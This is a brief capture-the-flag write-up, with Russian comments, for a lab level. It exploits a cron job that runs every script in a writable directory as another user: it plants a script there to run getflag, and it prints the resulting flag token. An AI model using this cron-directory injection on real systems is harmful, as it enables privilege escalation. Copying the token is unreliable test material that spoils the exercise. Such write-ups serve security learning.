level05

You have new mail.

$ ls /var/mail
level05
здесь мы видим что каждые 2 минуты выполняется crontab
$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05


$ cat /usr/sbin/openarenaserver
#!/bin/sh
отсюда нам стало понятно, что выполняются все скрипты из папки
for i in /opt/openarenaserver/* ; do
    (ulimit -t 5; bash -x "$i")
    rm -f "$i"
done

Создаем скрипт и добавляем его в папку, а результат кладем в tmp
$ cat > /opt/openarenaserver/printflag <<EOF
getflag > /tmp/flag
EOF

cat /tmp/flag

Check flag.Here is your token : viuaaale9huek52boumoomioc

